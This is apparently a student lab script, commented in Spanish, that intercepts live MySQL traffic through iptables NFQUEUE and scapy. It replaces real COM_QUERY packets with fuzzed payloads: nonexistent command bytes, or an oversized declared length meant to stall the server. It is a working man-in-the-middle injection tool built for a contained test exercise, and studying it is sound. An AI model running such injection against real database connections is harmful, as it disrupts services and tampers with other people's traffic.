#!/usr/bin/env python3
"""
fuzzing.py — dos inyecciones de tráfico vía fuzzing (Tarea 3, spec §6).

A diferencia de mitm_nfqueue.py (que hace *tampering* de un campo válido), acá
INYECTAMOS basura: reemplazamos el payload de un COM_QUERY real por contenido
(semi)aleatorio o malformado y observamos cómo reacciona el servicio.

Estrategia de inyección (spec §6, decisión tomada): reescritura vía NFQUEUE
sobre un paquete ya en vuelo. Así heredamos los seq/ack correctos de la conexión
TCP viva de CloudBeaver y no tenemos que reconstruir el handshake MySQL ni el
three-way handshake TCP a mano (menor riesgo para la demo/video).

Requiere las mismas reglas iptables que mitm_nfqueue.py:
    iptables -A OUTPUT -p tcp --dport 3306 -j NFQUEUE --queue-num 1
    iptables -A INPUT  -p tcp --sport 3306 -j NFQUEUE --queue-num 1

MODOS:
  comando -> Inyección 1: byte de comando aleatorio fuera del rango válido
             (0x20-0xff, comandos inexistentes). Esperado: error packet 0xFF
             (típ. 1047 "Unknown command") y posible cierre de conexión.
  largo   -> Inyección 2: largo declarado enorme (0xFFFFFF = 16MB) con cuerpo
             corto. Esperado: el servidor queda esperando bytes que no llegan
             -> timeout de aplicación (mismo mecanismo que la NOTA de §2).

Si el comportamiento observado NO coincide con el esperado, documentar la
hipótesis en el informe (requisito explícito del enunciado).

Uso:
    docker exec -it scapy_mitm python3 /scripts/fuzzing.py --modo comando
"""
import argparse
import random
from datetime import datetime

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

from sniffer import parsear_mysql_header, COM_QUERY

LOG_PATH = "/scripts/log_fuzzing.txt"


def _log(msg: str):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    linea = f"{ts} | {msg}"
    print(linea)
    with open(LOG_PATH, "a") as f:
        f.write(linea + "\n")


def fuzz_comando():
    """Inyección 1: header coherente, byte de comando inexistente + cuerpo random."""
    comando = random.randint(0x20, 0xFF)          # comandos inexistentes
    cuerpo = bytes([comando]) + random.randbytes(random.randint(0, 40))
    largo = len(cuerpo).to_bytes(3, "little")
    seq_id = bytes([0x00])
    payload = largo + seq_id + cuerpo
    return payload, f"comando=0x{comando:02x} largo_real={len(cuerpo)}"


def fuzz_largo():
    """Inyección 2: largo declarado enorme (16MB) con cuerpo corto."""
    cuerpo = random.randbytes(10)
    largo = (0xFFFFFF).to_bytes(3, "little")       # dice 16MB, manda 10 bytes
    seq_id = bytes([0x00])
    payload = largo + seq_id + cuerpo
    return payload, f"largo_declarado=0xFFFFFF largo_real={len(cuerpo)}"


def hacer_procesar(modo, limite):
    estado = {"inyectados": 0}
    generador = {"comando": fuzz_comando, "largo": fuzz_largo}[modo]

    def procesar(pkt):
        ip = IP(pkt.get_payload())

        # Solo reescribimos COM_QUERY del cliente, y solo hasta 'limite' veces.
        if ip.haslayer(Raw) and estado["inyectados"] < limite:
            payload = bytes(ip[Raw].load)
            parsed = parsear_mysql_header(payload)
            if parsed is not None:
                _largo, _seq, comando, _resto = parsed
                if comando == COM_QUERY:
                    nuevo_payload, detalle = generador()
                    ip[Raw].load = nuevo_payload
                    del ip[IP].len, ip[IP].chksum, ip[TCP].chksum
                    pkt.set_payload(bytes(ip))
                    estado["inyectados"] += 1
                    _log(f"[FUZZ {modo}] #{estado['inyectados']} inyectado | {detalle}")
                    pkt.accept()
                    return

        # Respuestas del servidor: las registramos para ver el efecto.
        if ip.haslayer(Raw) and ip.haslayer(TCP) and ip[TCP].sport == 3306:
            resp = bytes(ip[Raw].load)
            if resp and resp[4:5] == b"\xff":
                _log(f"[RESP servidor] ERROR packet: {resp[:60].hex()}")

        pkt.accept()

    return procesar


def main():
    parser = argparse.ArgumentParser(description="Fuzzing de tráfico MySQL vía NFQUEUE (Tarea 3).")
    parser.add_argument("--modo", choices=["comando", "largo"], required=True,
                        help="Inyección a aplicar (una por vez, para trazabilidad).")
    parser.add_argument("--limite", type=int, default=1,
                        help="Cuántos COM_QUERY reescribir antes de dejar pasar el resto (default: 1).")
    args = parser.parse_args()

    nfqueue = NetfilterQueue()
    nfqueue.bind(1, hacer_procesar(args.modo, args.limite))
    _log(f"[*] Fuzzing en NFQUEUE #1 | modo={args.modo} | limite={args.limite} | Ctrl-C para salir.")
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[*] Fin.")
    finally:
        nfqueue.unbind()


if __name__ == "__main__":
    main()
